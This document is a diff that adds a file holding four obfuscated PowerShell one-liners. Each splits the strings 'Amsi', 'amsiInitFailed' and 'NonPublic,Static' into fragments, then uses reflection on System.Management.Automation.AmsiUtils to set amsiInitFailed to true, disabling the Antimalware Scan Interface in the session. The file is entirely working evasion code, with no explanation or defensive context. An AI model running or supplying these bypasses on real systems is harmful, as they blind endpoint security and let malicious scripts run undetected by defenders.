@@ -1,0 +1,10 @@
+$m1='A';$m3='i';$m2='ms';$m=$m1+$m2+$m3;$a1='am';$a2='si';$a3='Ini';$a4='tFa';$a5='il';$a6='ed';$a=$a1+$a2+$a3+$a4+$a5+$a6;$b1='No';$b2='nPu';$b3='bli';$b4='c,St';$b5='at';$b6='ic';$b=$b1+$b2+$b3+$b4+$b5+$b6;$ex=$null;$extra1=[Ref];$extra2=$extra1.Assembly;$extra3=$extra2.GetType('System.Management.Automation.'+$m+'U'+'tils');$test=$extra3.GetField($a,$b);$test.SetValue($ex,$true)
+
+
+$str2='ms';$str1='A';$str3='i';$str=$str1+$str2+$str3;$dull=$null;$test1=[Ref].Assembly.GetType('System.Management.Automation.'+$str+'Utils');$test2=$test1.GetField($str.ToLower()+'InitFailed','NonPublic,Static');$test2.SetValue($dull,$true)
+
+
+$a2='ms';$a1='A';$a3='i';$a=$a1+$a2+$a3;$b=$null;$lol1=[Ref].Assembly.GetType('System.Management.Automation.'+$a+'U'+'tils');$lol2=$lol1.GetField($a.ToLower()+'InitFailed','NonPublic,Static');$lol2.SetValue($b,$true)
+
+
+$m1='A';$m3='i';$m2='ms';$m=$m1+$m2+$m3;$a1='am';$a2='si';$a=$a1+$a2+'InitFailed';$b1='No';$b2='nPu';$b3='bli';$b4='c,St';$b5='at';$b6='ic';$b=$b1+$b2+$b3+$b4+$b5+$b6;$ex=$null;$aaa1=[Ref].Assembly.GetType('System.Management.Automation.'+$m+'Utils').GetField($a,$b);$aaa1.SetValue($ex,$true)
